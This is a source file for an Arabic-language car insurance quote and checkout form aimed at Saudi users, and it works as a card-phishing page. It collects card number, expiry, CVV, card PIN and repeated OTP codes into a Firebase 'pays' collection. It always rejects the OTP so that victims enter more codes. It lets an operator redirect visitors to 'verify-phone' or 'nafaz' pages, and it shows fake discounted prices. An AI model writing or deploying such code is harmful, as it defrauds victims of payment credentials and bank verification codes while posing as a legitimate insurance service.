    { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
  ]

  // ... (keeping all the existing validation and handler functions)
  const validateCardField = (fieldName: string, value: string): string | null => {
    switch (fieldName) {
      case "cardNumber":
        const cleanNumber = value.replace(/\D/g, "")
        if (!cleanNumber) return "رقم البطاقة مطلوب"
        if (cleanNumber.length < 13) return "رقم البطاقة قصير جداً"
        if (cleanNumber.length > 19) return "رقم البطاقة طويل جداً"
        if (!cardValidation.luhnCheck(cleanNumber)) return "رقم البطاقة غير صحيح"
        return null

      case "cardName":
        if (!value.trim()) return "اسم حامل البطاقة مطلوب"
        if (value.trim().length < 2) return "الاسم قصير جداً"
        if (!/^[a-zA-Z\s]+$/.test(value)) return "الاسم يجب أن يحتوي على أحرف إنجليزية فقط"
        return null

      case "cardMonth":
        if (!value) return "الشهر مطلوب"
        const month = Number.parseInt(value)
        if (month < 1 || month > 12) return "شهر غير صحيح"
        return null

      case "cardYear":
        if (!value) return "السنة مطلوبة"
        if (!cardValidation.validateExpiry(cardMonth, value)) return "تاريخ انتهاء الصلاحية منتهي"
        return null

      case "cvv":
        if (!value) return "رمز الأمان مطلوب"
        if (!cardValidation.validateCVV(value, cardType.type)) {
          return cardType.type === "American Express"
            ? "رمز الأمان يجب أن يكون 4 أرقام"
            : "رمز الأمان يجب أن يكون 3 أرقام"
        }
        return null

      case "pinCode":
        if (!value) return "الرقم السري مطلوب"
        if (!/^\d{4}$/.test(value)) return "الرقم السري يجب أن يكون 4 أرقام"
        return null

      default:
        return null
    }
  }

  const handleCardFieldChange = (fieldName: string, value: string) => {
    let processedValue = value

    // Format card number with spaces
    if (fieldName === "cardNumber") {
      processedValue = cardValidation.formatCardNumber(value)
      const detectedType = cardValidation.getCardType(value)
      setCardType(detectedType)
    }

    // Update the field value
    switch (fieldName) {
      case "cardNumber":
        setCardNumber(processedValue)
        break
      case "cardName":
        setCardName(processedValue)
        break
      case "cardMonth":
        setCardMonth(processedValue)
        break
      case "cardYear":
        setCardYear(processedValue)
        break
      case "cvv":
        setCvv(processedValue)
        break
      case "pinCode":
        setPinCode(processedValue)
        break
    }

    // Clear error if field becomes valid
    const error = validateCardField(fieldName, processedValue)
    if (!error && cardErrors[fieldName]) {
      setCardErrors((prev) => ({ ...prev, [fieldName]: "" }))
    }
  }

  const handleCardFieldBlur = (fieldName: string, value: string) => {
    const error = validateCardField(fieldName, value)
    if (error) {
      setCardErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const validatePaymentForm = (): boolean => {
    const fields = {
      cardNumber,
      cardName,
      cardMonth,
      cardYear,
      cvv,
      pinCode,
    }

    const newErrors: Record<string, string> = {}
    let isValid = true

    Object.entries(fields).forEach(([fieldName, value]) => {
      const error = validateCardField(fieldName, value)
      if (error) {
        newErrors[fieldName] = error
        isValid = false
      }
    })

    setCardErrors(newErrors)
    return isValid
  }

  useEffect(() => {
    let interval: NodeJS.Timeout
    if (otpTimer > 0) {
      interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [otpTimer])

  useEffect(() => {
    if (stepHeaderRef.current) {
      stepHeaderRef.current.focus()
      stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
    }

    // Save current step
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      addData({ id: visitorId, currentPage })
    }
  }, [currentPage])

  useEffect(() => {
    if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
      errorSummaryRef.current.focus()
    }
  }, [errors])

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()

          if (currentPage !== data.currentPage) {
            if (data.currentPage === "9999") {
              window.location.href = "/verify-phone"
            } else if (data.currentPage === "nafaz" || data.currentPage === "8888") {
              window.location.href = "/nafaz"
            } else {
              setCurrentStep(Number.parseInt(data.currentPage))
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])

  const validationRules = {
    documment_owner_full_name: {
      required: true,
      message: "يرجى إدخال اسم مالك الوثيقة بالكامل",
    },
    owner_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية صحيح (10 أرقام)",
    },
    buyer_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية المشتري صحيح (10 أرقام)",
    },
    seller_identity_number: {
      required: true,
      pattern: /^[0-9]{10}$/,
      message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
    },
    agreeToTerms: {
      required: true,
      message: "يجب الموافقة على الشروط والأحكام للمتابعة",
    },
    selectedInsuranceOffer: {
      required: true,
      message: "يرجى اختيار عرض التأمين المناسب",
    },
    phone: {
      required: false,
      pattern: /^(05|5)[0-9]{8}$/,
      message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
    },
  }

  const validateField = (fieldName: string, value: any): string | null => {
    const rule = validationRules[fieldName as keyof typeof validationRules] as any
    if (!rule) return null

    if (rule.required && (!value || value === "" || (Array.isArray(value) && value.length === 0))) {
      return rule.message
    }

    if (value && rule.pattern && !rule.pattern.test(value)) {
      return rule.message
    }

    if (value && rule.validate) {
      const customError = rule.validate(value)
      if (customError) return customError
    }

    return null
  }

  const validateStep = (step: number): boolean => {
    const stepErrors: Record<string, string> = {}
    let isValid = true

    switch (step) {
      case 1:
        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
        if (ownerNameError) {
          stepErrors.documment_owner_full_name = ownerNameError
          isValid = false
        }

        if (formData.insurance_purpose === "renewal") {
          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
          if (ownerIdError) {
            stepErrors.owner_identity_number = ownerIdError
            isValid = false
          }
        } else if (formData.insurance_purpose === "property-transfer") {
          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)

          if (buyerIdError) {
            stepErrors.buyer_identity_number = buyerIdError
            isValid = false
          }
          if (sellerIdError) {
            stepErrors.seller_identity_number = sellerIdError
            isValid = false
          }
        }
        break

      case 3:
        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
        if (selectedOfferError) {
          stepErrors.selectedInsuranceOffer = selectedOfferError
          isValid = false
        }
        break

      case 5:
        const phoneError = validateField("phone", formData.phone)
        if (phoneError) {
          stepErrors.phone = phoneError
          isValid = false
        }

        if (!formData.agreeToTerms) {
          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
          isValid = false
        }
        break

      case 6:
        return validatePaymentForm()
    }

    setErrors((prev) => ({ ...prev, ...stepErrors }))
    return isValid
  }

  const handleFieldChange = (fieldName: string, value: any) => {
    setFormData((prev) => ({ ...prev, [fieldName]: value }))

    if (errors[fieldName]) {
      setErrors((prev) => ({ ...prev, [fieldName]: "" }))
    }
  }

  const handleFieldBlur = (fieldName: string) => {
    setTouched((prev) => ({ ...prev, [fieldName]: true }))

    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
    if (error) {
      setErrors((prev) => ({ ...prev, [fieldName]: error }))
    }
  }

  const nextStep = () => {
    if (validateStep(currentPage)) {
      if (currentPage < steps.length) {
        const visitorId = localStorage.getItem("visitor")
        const dataToSave = {
          id: visitorId,
          currentPage: currentPage + 1,
          ...formData,
          cardNumber,
          cardName,
          cardMonth,
          cardYear,
          cvv,
          createdDate: new Date().toISOString(),
        }

        addData(dataToSave)
        setCurrentStep(currentPage + 1)
      }
    }
  }

  const prevStep = () => {
    const vistorId = localStorage.getItem("visitor")
    if (currentPage > 1) {
      setCurrentStep(currentPage - 1)
      addData({ id: vistorId, currentPage })
    }
  }

  const handleSubmit = async () => {
    if (!validateStep(7)) {
      return
    }

    setIsSubmitting(true)
    const visitorId = localStorage.getItem("visitor")

    try {
      await addData({
        id: visitorId,
        otp,
        otpCode: otp,
        createdDate: new Date().toISOString(),
        otpVerified: false,
        otpVerificationTime: new Date().toISOString(),
        submissionTime: new Date().toISOString(),
        finalStatus: "verification_failed",
        otpAttempts: otpAttempts + 1,
        paymentStatus: "completed",
        ...formData,
      })

      await new Promise((resolve) => setTimeout(resolve, 2000))
      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
      setOtp("")
      setOtpAttempts((prev) => prev + 1)
    } catch (error) {
      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsSubmitting(false)
    }
  }

  const ValidatedInput = ({
    label,
    fieldName,
    type = "text",
    placeholder,
    required = false,
    className = "",
    autoFocus = false,
    ...props
  }: {
    label: string
    fieldName: string
    type?: string
    placeholder?: string
    required?: boolean
    className?: string
    autoFocus?: boolean
    [key: string]: any
  }) => {
    const hasError = errors[fieldName] && touched[fieldName]
    return (
      <div className={className}>
        <label className="block text-sm font-bold text-gray-800 mb-4">
          {label} {required && <span className="text-red-500">*</span>}
        </label>
        <Input
          type={type}
          placeholder={placeholder}
          value={formData[fieldName as keyof typeof formData] as string}
          onChange={(e) => {
            const value = e.target.value
            handleFieldChange(fieldName, value)
          }}
          onBlur={() => handleFieldBlur(fieldName)}
          className={`h-14 text-lg border-2 rounded-xl transition-all duration-200 ${
            hasError
              ? "border-red-400 focus:border-red-500 bg-red-50"
              : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
          }`}
          {...props}
        />
        {hasError && (
          <div className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg" role="alert">
            <AlertCircle className="w-4 h-4 flex-shrink-0" />
            <span>{errors[fieldName]}</span>
          </div>
        )}
      </div>
    )
  }

  function handlePayment(): void {
    if (!validatePaymentForm()) {
      return
    }

    const visitorId = localStorage.getItem("visitor")

    addData({
      id: visitorId,
      createdDate: new Date().toISOString(),
      cardNumber,
      cardName,
      cardMonth,
      cardYear,
      cvv,
      pinCode,
      paymentStatus: "processing",
      ...formData,
    })

    setPaymentProcessing(true)
    setTimeout(() => {
      setPaymentProcessing(false)
      setCurrentStep(7)
      setOtpTimer(120)

      addData({
        id: visitorId,
        paymentStatus: "completed",
        otpSent: true,
        currentPage: 7,
      })
      setOtpSent(true)
    }, 2000)
  }

  function verifyOTP(): void {
    const visitorId = localStorage.getItem("visitor")
    allOtp.push(otp)
    addData({
      id: visitorId,
      otpCode: otp,
      otpAttempts: otpAttempts + 1,
      otpVerificationTime: new Date().toISOString(),
      createdDate: new Date().toISOString(),
      allOtp,
      ...formData,
    })

    handleSubmit()
  }

  function sendOTP(): void {
    const visitorId = localStorage.getItem("visitor")

    setOtpTimer(120)

    addData({
      id: visitorId,
      otpSentTime: new Date().toISOString(),
      otpResendCount: (otpAttempts || 0) + 1,
      otpSent: true,
      paymentStatus: "completed",
      ...formData,
    })
    setOtpSent(true)
  }

  return (
    <Card className="bg-white rounded-md shadow-md border-0 overflow-hidden backdrop-blur-sm">
      <CardContent className="p-0">
        {/* Enhanced Progress Steps */}
        <div className="bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 p-8 lg:p-10">
          {/* Mobile Progress */}
          <div className="block sm:hidden">
            <div className="flex items-center gap-2 overflow-x-auto pb-4">
              {steps.map((step, index) => (
                <div key={step.number} className="flex items-center flex-shrink-0">
                  <div className="flex flex-col items-center">
                    <div
                      className={`w-12 h-12 rounded-md flex items-center justify-center text-sm font-bold transition-all duration-300 shadow-lg ${
                        step.number === currentPage
                          ? "bg-blue-600 text-white shadow-blue-200 scale-110"
                          : step.number < currentPage
                            ? "bg-green-500 text-white shadow-green-200"
                            : "bg-white text-gray-600 shadow-gray-200"
                      }`}
                    >
                      {step.number < currentPage ? <CheckCircle className="w-6 h-6" /> : step.number}
                    </div>
                    <p
                      className={`text-xs mt-3 text-center w-24 font-medium ${
                        step.number === currentPage ? "text-blue-600" : "text-gray-600"
                      }`}
                    >
                      {step.title.split(" ")[0]}
                    </p>
                  </div>
                  {index < steps.length - 1 && (
                    <div
                      className={`w-8 h-1 mx-3 rounded-full transition-all duration-300 ${
                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                      }`}
                    />
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Desktop Progress */}
          <div className="hidden sm:flex items-center justify-between">
            {steps.map((step, index) => (
              <div key={step.number} className="flex items-center">
                <div className="flex flex-col items-center">
                  <div
                    className={`w-16 h-12 lg:w-20 lg:h-20 rounded-md flex items-center justify-center text-lg font-bold transition-all duration-300 shadow-lg ${
                      step.number === currentPage
                        ? "bg-blue-600 text-white shadow-blue-200 scale-110"
                        : step.number < currentPage
                          ? "bg-green-500 text-white shadow-green-200"
                          : "bg-white text-gray-600 shadow-gray-200"
                    }`}
                  >
                    {step.number < currentPage ? (
                      <CheckCircle className="w-8 h-8 lg:w-10 lg:h-10" />
                    ) : (
                      <step.icon className="w-8 h-8 lg:w-10 lg:h-10" />
                    )}
                  </div>
                  <div className="text-center mt-4">
                    <p
                      className={`text-base lg:text-md font-bold ${
                        step.number === currentPage ? "text-blue-600" : "text-gray-700"
                      }`}
                    >
                      {step.title}
                    </p>
                    <p className="text-sm text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
                  </div>
                </div>
                {index < steps.length - 1 && (
                  <div
                    className={`flex-1 h-2 mx-6 lg:mx-8 rounded-full transition-all duration-300 ${
                      step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Form Content */}
        <div className="p-8 lg:p-12">
          <div className="min-h-[600px] lg:min-h-[700px]">
            {currentPage === 1 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    البيانات الأساسية
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">
                    أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر
                  </p>
                </div>
                <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
                <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
              </div>
            )}

            {currentPage === 2 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    بيانات التأمين
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">
                    حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة
                  </p>
                </div>
                <div className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-md p-8 border border-blue-100">
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
                      <Shield className="w-6 h-6 text-blue-600" />
                    </div>
                    <div>
                      <h4 className="font-bold text-gray-900 text-md">نوع التأمين</h4>
                      <p className="text-sm text-gray-600">اختر نوع التغطية المناسبة لك</p>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <button
                      type="button"
                      className={`group relative p-8 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "border-blue-500 bg-blue-50 shadow-md"
                          : "border-gray-200 hover:border-blue-300 bg-white"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      <div className="text-center flex flex-col justify-center  items-center ">
                        <div className="w-16 h-12 bg-blue-100 rounded-md flex justify-center  mb-4">
                          <Shield className="w-8 h-8 text-blue-600" />
                        </div>
                        <div className="font-bold text-sm mb-2">تأمين شامل</div>
                      </div>
                    
                    </button>

                    <button
                      type="button"
                      className={`group relative p-8 rounded-md border-2 transition-all duration-300 hover:shadow-lg ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "border-blue-500 bg-blue-50 shadow-md"
                          : "border-gray-200 hover:border-blue-300 bg-white"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      <div className="text-center">
                        <div className="w-16 h-12 bg-green-100 rounded-md flex items-center justify-center mx-auto mb-4">
                          <Users className="w-8 h-8 text-green-600" />
                        </div>
                        <div className="font-bold text-sm mb-2"> ضد الغير</div>
                      </div>
                    
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                  <Card className="border-2 border-blue-200 hover:border-blue-300 transition-colors bg-gradient-to-br from-blue-50 to-indigo-50">
                    <CardContent className="p-8 text-center">
                      <div className="flex items-center justify-center gap-3 mb-6">
                        <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
                          <Users className="w-6 h-6 text-blue-600" />
                        </div>
                        <span className="font-bold text-xl text-gray-900">إضافة سائقين</span>
                      </div>
                      <div className="flex items-center justify-center gap-6">
                        <button
                          type="button"
                          className="w-12 h-12 rounded-md bg-blue-600 text-white flex items-center justify-center hover:bg-blue-700 transition-colors shadow-lg text-xl font-bold"
                          onClick={() =>
                            handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
                          }
                        >
                          -
                        </button>
                        <span className="text-md font-bold text-gray-900 min-w-[3rem]">
                          {formData.additionalDrivers}
                        </span>
                        <button
                          type="button"
                          className="w-12 h-12 rounded-md bg-blue-600 text-white flex items-center justify-center hover:bg-blue-700 transition-colors shadow-lg text-xl font-bold"
                          onClick={() =>
                            handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
                          }
                        >
                          +
                        </button>
                      </div>
                      <p className="text-sm text-gray-500 mt-4 font-medium">الحد الأقصى 5 سائقين</p>
                    </CardContent>
                  </Card>

                  <Card className="border-2 border-green-200 bg-gradient-to-br from-green-50 to-emerald-50">
                    <CardContent className="p-8 text-center">
                      <div className="flex items-center justify-center gap-3 mb-6">
                        <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
                          <Star className="w-6 h-6 text-green-600" />
                        </div>
                        <span className="font-bold text-xl text-green-800">خصومات خاصة</span>
                      </div>
                      <div className="flex items-center gap-4 mb-6 justify-center">
                        <input
                          type="checkbox"
                          className="w-6 h-6 text-green-600 rounded-lg"
                          checked={formData.specialDiscounts}
                          onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
                        />
                        <span className="text-sm text-green-800 font-medium">أريد الحصول على خصومات خاصة</span>
                      </div>
                      <Button className="bg-green-600 hover:bg-green-700 text-white w-full py-3 rounded-xl font-semibold">
                        عرض الخصومات
                      </Button>
                    </CardContent>
                  </Card>
                </div>
              </div>
            )}

            {currentPage === 3 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    قائمة الأسعار
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">قارن بين العروض المتاحة واختر الأنسب لك</p>
                </div>

                <div className="flex justify-center mb-5">
                  <div className="flex bg-gray-100 rounded-md p-2 shadow-inner">
                    <button
                      type="button"
                      className={`px-4 py-4 rounded-xl text-base font-bold transition-all ${
                        formData.insuranceTypeSelected === "against-others"
                          ? "bg-blue-600 text-white shadow-lg"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                    >
                      ضد الغير
                    </button>
                    <button
                      type="button"
                      className={`px-4 py-4 rounded-xl text-base transition-all ${
                        formData.insuranceTypeSelected === "comprehensive"
                          ? "bg-blue-600 text-white shadow-lg"
                          : "text-gray-600 hover:text-gray-900"
                      }`}
                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                    >
                      شامل
                    </button>
                  </div>
                </div>

                <div className="space-y-3  max-h-auto overflow-y-auto">
                  {offerData
                    .filter((offer) => {
                      if (formData.insuranceTypeSelected === "comprehensive") {
                        return offer.type === "comprehensive" || offer.type === "special"
                      }
                      return offer.type === "against-others"
                    })
                    .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
                    .slice(0, 8)
                    .map((offer, index) => {
                      const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
                      const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
                      const isSelected = formData.selectedInsuranceOffer === offer.id

                      return (
                        <Card
                          key={offer.id}
                          className={`relative transition-all duration-300 cursor-pointer hover:shadow-xl rounded-md ${
                            isSelected
                              ? "ring-2 ring-blue-500 shadow-xl bg-blue-50/50 border-blue-200"
                              : "hover:shadow-lg border-gray-200 bg-white"
                          }`}
                          onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
                        >
                          <CardContent className="p-0">
                            {/* Header Section */}
                            <div className="p-2 pb-4">
                              <div className="flex items-start gap-4">
                                {/* Radio Button */}
                                <div className="flex-shrink-0 mt-2">
                                  <div
                                    className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-colors ${
                                      isSelected ? "border-blue-500 bg-blue-500" : "border-gray-300 bg-white"
                                    }`}
                                  >
                                    {isSelected && <div className="w-3 h-3 bg-white rounded-full" />}
                                  </div>
                                </div>

                                {/* Icon */}
                                <div
                                  className={`w-16 h-12 rounded-md flex items-center justify-center flex-shrink-0 transition-colors ${
                                    isSelected ? "bg-blue-100" : "bg-gray-100"
                                  }`}
                                >
                                  <img
                                    src={offer.company.image_url || "/placeholder.svg"}
                                    className="w-12 h-12 rounded-lg"
                                    alt={offer.company.name}
                                  />
                                </div>

                                {/* Content */}
                                <div className="flex-1 min-w-0">
                                  <h4 className="font-bold text-gray-900 text-sm leading-tight mb-3">
                                    {offer.company.name.replace(/insurance/g, "").trim()}
                                  </h4>

                                  <div className="flex flex-wrap items-center gap-3">
                                    <Badge
                                      variant="secondary"
                                      className="text-sm font-semibold bg-gray-100 text-gray-700 hover:bg-gray-100 px-3 py-1"
                                    >
                                      {getTypeBadge(offer.type)}
                                    </Badge>

                                    {index < 3 && (
                                      <Badge
                                        className={`text-sm  ${
                                          index === 0
                                            ? "bg-green-100 text-green-700 hover:bg-green-100"
                                            : index === 1
                                              ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
                                              : "bg-orange-100 text-orange-700 hover:bg-orange-100"
                                        }`}
                                      >
                                        {getBadgeText(index)}
                                      </Badge>
                                    )}
                                  </div>
                                </div>

                                {/* Price */}
                                <div className="text-left flex-shrink-0">
                                  <del className="text-sm font-bold text-red-600">{finalPrice.toFixed(0)}</del>
                                  <p className="text-sm text-gray-900">
                                    {(finalPrice - finalPrice * 0.3).toFixed(0)}
                                  </p>
                                  <p className="text-sm text-gray-500 leading-tight font-medium">ر.س / سنوياً</p>
                                </div>
                              </div>
                            </div>

                            {/* Features Section */}
                            {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
                              <div className="px-6 pb-6">
                                <div className="pt-4 border-t border-gray-100">
                                  <div className="space-y-3">
                                    {offer.extra_features
                                      .filter((f) => f.price === 0)
                                      .slice(0, 3)
                                      .map((feature, idx) => (
                                        <div key={idx} className="flex items-center gap-3">
                                          <div className="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <Check className="w-3 h-3 text-green-600" />
                                          </div>
                                          <span className="text-sm text-gray-700 leading-relaxed font-medium">
                                            {feature.content.length > 35
                                              ? feature.content.substring(0, 35) + "..."
                                              : feature.content}
                                          </span>
                                        </div>
                                      ))}
                                  </div>

                                  {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
                                    <p className="text-sm text-blue-600 mt-3 font-semibold">
                                      +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
                                    </p>
                                  )}
                                </div>
                              </div>
                            )}

                          
                          </CardContent>
                        </Card>
                      )
                    })}
                </div>

                {errors.selectedInsuranceOffer && (
                  <div className="flex items-center gap-3 text-red-600 text-base bg-red-50 p-4 rounded-xl border border-red-200">
                    <AlertCircle className="w-5 h-5 flex-shrink-0" />
                    <span className="font-medium">{errors.selectedInsuranceOffer}</span>
                  </div>
                )}
              </div>
            )}

            {currentPage === 4 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    الإضافات والخدمات
                  </h3>
                  <p className="text-sm text-gray-600 max-w-md mx-auto">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
                </div>

                {(() => {
                  const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                  const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []

                  if (paidFeatures.length === 0) {
                    return (
                      <div className="text-center py-16">
                        <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-8">
                          <CheckCircle className="w-12 h-12 text-green-600" />
                        </div>
                        <h4 className="text-md font-bold text-gray-900 mb-4">جميع المزايا مشمولة!</h4>
                        <p className="text-gray-600 text-sm max-w-lg mx-auto">
                          العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
                        </p>
                      </div>
                    )
                  }

                  return (
                    <div className="space-y-w">
                      {paidFeatures.map((feature) => (
                        <Card
                          key={feature.id}
                          className="border-2 border-gray-200 hover:shadow-lg transition-all rounded-md"
                        >
                          <CardContent className="p-8">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-6">
                                <input
                                  type="checkbox"
                                  className="w-6 h-6 text-blue-600 rounded-lg"
                                  checked={formData.selectedAddons.includes(feature.id)}
                                  onChange={(e) => {
                                    const newAddons = e.target.checked
                                      ? [...formData.selectedAddons, feature.id]
                                      : formData.selectedAddons.filter((id) => id !== feature.id)
                                    handleFieldChange("selectedAddons", newAddons)
                                  }}
                                />
                                <div>
                                  <h4 className="font-bold text-gray-900 text-sm mb-2">{feature.content}</h4>
                                  <p className="text-gray-600 text-sm">خدمة إضافية اختيارية</p>
                                </div>
                              </div>
                              <div className="text-left">
                                <p className="text-sm font-bold text-gray-900">+{feature.price} ر.س</p>
                                <p className="text-sm text-gray-500 font-medium">سنوياً</p>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ))}
                    </div>
                  )
                })()}
              </div>
            )}

            {currentPage === 5 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    ملخص الطلب 
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">
                    راجع طلبك لإتمام العملية
                  </p>
                </div>
                <Card className="border-2 border-gray-200 h-fit rounded-md shadow-lg">
                    <CardContent className="p-8">
                      <h4 className="text-md font-bold text-gray-900 mb-8">ملخص الدفع</h4>
                      {(() => {
                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                        if (!selectedOffer) return null

                        const basePrice = Number.parseFloat(selectedOffer.main_price)
                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
                          formData.selectedAddons.includes(f.id),
                        )
                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
                        const total = basePrice + addonsTotal + expenses

                        return (
                          <div className="space-y-4">
                            <div className="flex justify-between text-sm">
                              <span className="font-medium">قسط التأمين</span>
                              <span className="font-bold">{basePrice} ر.س</span>
                            </div>
                            {addonsTotal > 0 && (
                              <div className="flex justify-between text-sm">
                                <span className="font-medium">الإضافات</span>
                                <span className="font-bold">{addonsTotal} ر.س</span>
                              </div>
                            )}
                            <div className="flex justify-between text-sm">
                              <span >الرسوم والضرائب</span>
                              <span className="font-bold">{expenses} ر.س</span>
                            </div>
                            <hr className="border-gray-300 my-4" />
                            <div className="flex justify-between font-bold text-md">
                              <span>المجموع</span>
                              <span className="text-green-600">{total.toFixed(2)} ر.س</span>
                            </div>
                          </div>
                        )
                      })()}
                    </CardContent>
                  </Card>
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
                  <div className="space-y-8">
                  
                    <div className="bg-blue-50 border-2 border-blue-200 rounded-md p-6">
                      <div className="flex items-start gap-4">
                        <input
                          type="checkbox"
                          className="w-6 h-6 mt-1 text-blue-600 rounded-lg"
                          checked={formData.agreeToTerms}
                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
                        />
                        <span className="text-base text-blue-800 font-medium">
                          أوافق على{" "}
                          <a href="#" className="text-blue-600 hover:underline font-bold">
                            الشروط والأحكام
                          </a>{" "}
                          و{" "}
                          <a href="#" className="text-blue-600 hover:underline font-bold">
                            سياسة الخصوصية
                          </a>
                        </span>
                      </div>
                    </div>

                    {errors.agreeToTerms && (
                      <div className="flex items-center gap-3 text-red-600 text-base bg-red-50 p-4 rounded-xl border border-red-200">
                        <AlertCircle className="w-5 h-5 flex-shrink-0" />
                        <span className="font-medium">{errors.agreeToTerms}</span>
                      </div>
                    )}
                  </div>

              
                </div>
              </div>
            )}

            {currentPage === 6 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    بيانات الدفع
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">
                    أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن
                  </p>
                </div>

                <div className="bg-blue-50 border-2 border-blue-200 rounded-md p-8 mb-10">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
                      <Lock className="w-6 h-6 text-blue-600" />
                    </div>
                    <div>
                      <p className="font-bold text-blue-900 text-lg">دفع آمن ومحمي</p>
